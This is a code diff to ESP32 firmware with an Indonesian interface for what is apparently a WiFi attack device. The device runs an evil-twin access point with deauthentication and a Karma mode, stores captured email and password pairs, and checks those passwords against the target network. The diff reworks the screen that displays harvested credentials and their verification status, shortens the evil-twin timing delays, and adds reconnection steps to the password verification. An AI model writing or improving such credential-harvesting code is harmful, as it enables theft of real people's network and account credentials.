@@ -944,61 +944,61 @@ void drawViewPasswords() {
   drawHeader("PASSWORD TERSIMPAN", TFT_DARKCYAN);
   int total = prefs.getInt("pwd_count", 0);
   tft.setTextFont(2);
+
   if (total == 0) {
     tft.setTextColor(TFT_WHITE, TFT_BLACK);
     tft.setCursor(10, 40); tft.println("Belum ada data.");
-  } else {
-    for (int i = 0; i < 2; i++) {
-      int idx = viewScrollPos + i;
-      if (idx >= total) break;
-      int y = 28 + (i * 28);
-      if (idx == viewSelection) {
-        tft.fillRect(0, y, 240, 26, TFT_DARKCYAN);
-        drawCornerBrackets(2, y+1, 236, 24, TFT_CYAN);
-        tft.setTextColor(TFT_CYAN, TFT_DARKCYAN);
-      } else {
-        tft.fillRect(0, y, 240, 26, TFT_BLACK);
-        tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      }
-      String entry = prefs.getString(("pwd_" + String(idx)).c_str(), "");
-      int p1 = entry.indexOf('|');
-      String email = entry.substring(0, p1);
-      String rest = entry.substring(p1 + 1);
-      int p2 = rest.indexOf('|');
-      String pass, status = "";
-      if (p2 > 0) {
-        pass = rest.substring(0, p2);
-        String v = rest.substring(p2 + 1);
-        status = (v == "1") ? " OK" : " XX";
-      } else {
-        pass = rest;
-        status = " ?";
-      }
-      tft.setCursor(5, y + 2);
-      tft.print(email.substring(0, 13));
-      tft.setTextColor(TFT_GREEN, (idx == viewSelection) ? TFT_DARKCYAN : TFT_BLACK);
-      tft.setCursor(195, y + 2);
-      tft.print(status);
-      tft.setCursor(5, y + 14);
-      tft.setTextColor(TFT_YELLOW, (idx == viewSelection) ? TFT_DARKCYAN : TFT_BLACK);
-      tft.print(pass.substring(0, 12));
-      unsigned long ts = prefs.getULong(("pwd_ts_" + String(idx)).c_str(), 0);
-      tft.setTextColor(TFT_DARKGREY, (idx == viewSelection) ? TFT_DARKCYAN : TFT_BLACK);
-      tft.setCursor(150, y + 14);
-      tft.print(String(ts / 1000) + "s");
-    }
+    drawFooter("TOMBOL = KEMBALI");
+    return;
   }
-  int yDel = 85;
-  if (viewSelection == total) { tft.fillRect(0, yDel, 240, 15, TFT_RED); tft.setTextColor(TFT_WHITE, TFT_RED); }
-  else { tft.fillRect(0, yDel, 240, 15, TFT_BLACK); tft.setTextColor(TFT_RED, TFT_BLACK); }
-  tft.setCursor(10, yDel);
-  if (confirmDeleteAll) tft.print("> YAKIN? TEKAN LAGI!"); else tft.print("> HAPUS SEMUA DATA");
-  int yBack = 102;
-  if (viewSelection == total + 1) { tft.fillRect(0, yBack, 240, 15, TFT_GREEN); tft.setTextColor(TFT_BLACK, TFT_GREEN); }
-  else { tft.fillRect(0, yBack, 240, 15, TFT_BLACK); tft.setTextColor(TFT_WHITE, TFT_BLACK); }
-  tft.setCursor(10, yBack); tft.print("> KEMBALI");
-  drawFooter("ATAS: Scroll | BAWAH: OK");
+
+  if (viewSelection >= total) {
+    int y = 42;
+    if (viewSelection == total) {
+      tft.fillRect(0, y, 240, 28, TFT_RED);
+      tft.setTextColor(TFT_WHITE, TFT_RED);
+      tft.setCursor(10, y + 6);
+      tft.print(confirmDeleteAll ? "YAKIN? TEKAN LAGI!" : "HAPUS SEMUA DATA");
+    } else {
+      tft.fillRect(0, y, 240, 28, TFT_DARKGREEN);
+      tft.setTextColor(TFT_WHITE, TFT_DARKGREEN);
+      tft.setCursor(10, y + 6);
+      tft.print("< KEMBALI >");
+    }
+    drawFooter("ATAS: Pilih | BAWAH: OK");
+    return;
+  }
+
+  int idx = viewSelection;
+  String entry = prefs.getString(("pwd_" + String(idx)).c_str(), "");
+  int p1 = entry.indexOf('|');
+  String email = (p1 > 0) ? entry.substring(0, p1) : entry;
+  String rest = (p1 > 0) ? entry.substring(p1 + 1) : "";
+  int p2 = rest.indexOf('|');
+  String pass = (p2 > 0) ? rest.substring(0, p2) : rest;
+  String ver = (p2 > 0) ? rest.substring(p2 + 1) : "";
+
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.setCursor(10, 30); tft.print("Email:");
+  int ny = drawWrapped(email, 80, 30, 150, TFT_WHITE, 18);
+
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.setCursor(10, ny); tft.print("Pass:");
+  ny = drawWrapped(pass, 80, ny, 150, TFT_GREEN, 18);
+
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.setCursor(10, ny + 4);
+  tft.print("Status: ");
+  tft.setTextColor((ver == "1") ? TFT_GREEN : TFT_RED, TFT_BLACK);
+  tft.print((ver == "1") ? "BENAR" : ((ver == "0") ? "SALAH" : "?"));
+
+  tft.setTextColor(TFT_CYAN, TFT_BLACK);
+  tft.setCursor(10, ny + 22);
+  tft.print("Data "); tft.print(idx + 1); tft.print("/"); tft.print(total);
+
+  drawFooter("ATAS: Pilih | BAWAH: Hapus");
 }
+
 
 // ═══════════════════════════════════════════════
 // Karma UI
@@ -1762,7 +1762,7 @@ void stopEvilTwin();
 
 void startEvilTwinWithDeauth() {
   WiFi.mode(WIFI_AP_STA);
-  delay(200);
+  delay(100);
 
   String safeSSID = targetSSID;
   if (safeSSID.length() == 0) safeSSID = "Free_WiFi";
@@ -1775,7 +1775,7 @@ void startEvilTwinWithDeauth() {
     drawMainMenu();
     return;
   }
-  delay(500);
+  delay(250);
 
   uint8_t fakeMac[6];
   esp_wifi_get_mac(WIFI_IF_AP, fakeMac);
@@ -1920,6 +1920,10 @@ void beginVerification() {
   verifyStart = millis();
   Serial.printf("[VERIFY] Attempt %d/%d starting\n",
                 verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
+  WiFi.disconnect();
+  delay(150);
+  WiFi.mode(WIFI_STA);
+  delay(150);
   WiFi.begin(targetSSID.c_str(), capturedPass.c_str(), g_targetChannel, g_targetBSSID);
 }
 
